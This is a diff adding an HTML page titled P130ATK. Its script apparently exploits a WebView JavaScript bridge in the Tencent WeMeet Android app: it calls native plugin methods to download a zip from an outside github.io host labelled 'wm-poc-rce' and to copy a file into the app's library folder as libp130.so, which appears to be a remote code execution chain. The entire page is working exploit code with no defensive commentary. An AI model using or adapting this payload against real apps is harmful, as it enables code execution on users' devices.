@@ -1,0 +1,42 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P130ATK</title></head>
+<body><h1>P130ATK</h1>
+<script>
+document.title='P130ATK:'+location.host+':'+location.protocol;
+window.__a=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  document.title='P130ACB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
+};
+function c(id,mod,m,p){
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__a',module:mod,method:m,param:p,callId:id
+    }));
+  }catch(e){
+    document.title='P130ATK-NOJS:'+location.host;
+  }
+}
+if(!window.JSCallJavaMgr){document.title='P130ATK-NOMGR:'+location.host;}
+else{
+  setTimeout(function(){
+    document.title='P130ATK-H2';
+    c('H2','CommonPlugin','GetPerformance',{});
+  }, 800);
+  setTimeout(function(){
+    document.title='P130ATK-SE';
+    c('SE','Storage','ExportFile',{
+      src_path:'/data/user/0/com.tencent.wemeet.app/files/Users/Default/3706b639ea15ecbcc7e01d788ffb4366/ExportFile/p125.bin',
+      dst_path:'/data/user/0/com.tencent.wemeet.app/files/com.tencent.wemeet.app/files/lib/libp130.so'
+    });
+  }, 4800);
+  setTimeout(function(){
+    document.title='P130ATK-EF';
+    c('EF','CommonPlugin','ExportFile',{
+      fileName:'p130atk.bin',
+      contentType:'application/octet-stream',
+      url:'https://gitwhs.github.io/wm-poc-rce/p97avatar.zip'
+    });
+  }, 8800);
+}
+</script>
+</body></html>
